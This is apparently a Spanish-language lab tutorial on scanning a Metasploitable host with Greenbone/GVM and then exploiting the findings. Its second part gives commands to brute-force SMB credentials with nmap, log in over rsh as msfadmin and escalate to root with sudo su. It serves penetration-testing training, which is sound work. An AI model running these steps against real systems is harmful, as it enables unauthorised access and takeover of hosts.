---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Escanear host gvm

**Parte 1: Escanear un host en busca de vulnerabilidades**

1.  **Iniciar servicios GVM:**

    ```bash
    bashCopy codesudo gvm-start
    ```
2. **Acceder a Greenbone Security Assistant:**
   * Navegar a [https://127.0.0.1:9392](https://127.0.0.1:9392/)
   * Iniciar sesión con:
     * Usuario: `admin`
     * Contraseña: `kali`
3. **Escaneo del host Metasploitable:**
   * Navegar a Escaneos -> Tareas -> Asistente de tareas avanzadas.
   * Ingresar detalles y crear tarea para escanear Metasploitable.
4. **Ver informes y resultados:**
   * Esperar hasta que la tarea esté completa.
   * Acceder al informe y la pestaña Resultados.
5. **Interpretar resultados del escaneo:**
   * Hacer clic en la vulnerabilidad "El servicio rexec se está ejecutando" en la pestaña Resultados.

**Parte 2: Explotar una vulnerabilidad encontrada por GVM**

6.  **Descubrir nombres de usuario y contraseñas con Nmap:**

    ```bash
    sudo nmap -sV -p 445 -script smb-brute 172.17.0.2
    ```
7.  **Instalar cliente de shell remoto (RSH):**

    ```bash
    sudo apt-get install rsh-client
    ```
8.  **Iniciar sesión en Metasploitable usando RSH:**

    ```bash
    rsh -l msfadmin 172.17.0.2
    ```
9.  **Obtener acceso raíz:**

    ```bash
    sudo su
    ```
